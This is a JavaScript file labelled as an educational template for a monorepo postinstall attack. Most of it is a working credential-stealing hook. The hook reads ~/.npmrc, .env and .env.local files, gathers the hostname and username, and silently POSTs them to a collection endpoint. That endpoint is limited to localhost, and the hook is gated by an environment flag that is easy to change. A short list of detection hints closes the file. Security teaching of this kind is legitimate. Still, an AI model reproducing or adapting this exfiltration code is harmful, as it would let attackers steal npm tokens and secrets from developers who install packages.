/**
 * EDUCATIONAL EXAMPLE: Workspace/Monorepo Attack Template
 * 
 * This template demonstrates how to create a malicious workspace package
 * for educational purposes only.
 * 
 * ATTACK VECTOR:
 * - Compromise a workspace package in a monorepo
 * - Add malicious postinstall script
 * - When workspace is installed, postinstall executes automatically
 * - Affects all packages in the workspace
 * 
 * SAFETY FEATURES:
 * - Only works when TESTBENCH_MODE=enabled
 * - Only sends data to localhost
 * - Clearly marked as malicious
 * 
 * LEARNING OBJECTIVES:
 * - Understand workspace/monorepo attacks
 * - Learn to audit workspace packages
 * - Practice detection techniques
 * - Implement defense strategies
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ============================================================================
// MALICIOUS CODE SECTION - FOR EDUCATIONAL PURPOSES ONLY
// ============================================================================

/**
 * Post-install script that executes automatically
 * This is the attack vector - runs when workspace package is installed
 */
function maliciousPostInstall() {
  // SAFETY CHECK: Only run in testbench environment
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  console.log('[TESTBENCH] Simulating workspace/monorepo attack...');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: '@devcorp/utils', // Name of compromised workspace package
    version: '1.0.1',
    attackType: 'workspace-monorepo',
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    workspaceRoot: path.resolve(__dirname, '../..'),
    env: {
      NODE_ENV: process.env.NODE_ENV,
    },
    files: {}
  };

  // Try to read sensitive files from workspace root
  const workspaceRoot = path.resolve(__dirname, '../..');
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(workspaceRoot, '.env'),
    path.join(workspaceRoot, '.env.local'),
    path.join(workspaceRoot, 'package.json'),
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Exfiltrate data to attacker server (localhost in testbench)
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent successfully
  });

  req.on('error', () => {
    // Silently fail
  });

  req.write(payload);
  req.end();
}

// Execute if this is a postinstall script
if (require.main === module) {
  maliciousPostInstall();
}

module.exports = { maliciousPostInstall };

// ============================================================================
// DETECTION HINTS FOR LEARNERS:
// ============================================================================
// Red flags to look for in workspace packages:
// 1. Postinstall scripts in workspace packages
// 2. Unexpected network requests during workspace install
// 3. File system access to workspace root
// 4. Environment variable access
// 5. Suspicious version numbers
// 6. Packages with unusual workspace dependencies
// 7. Packages that access files outside their directory
// ============================================================================
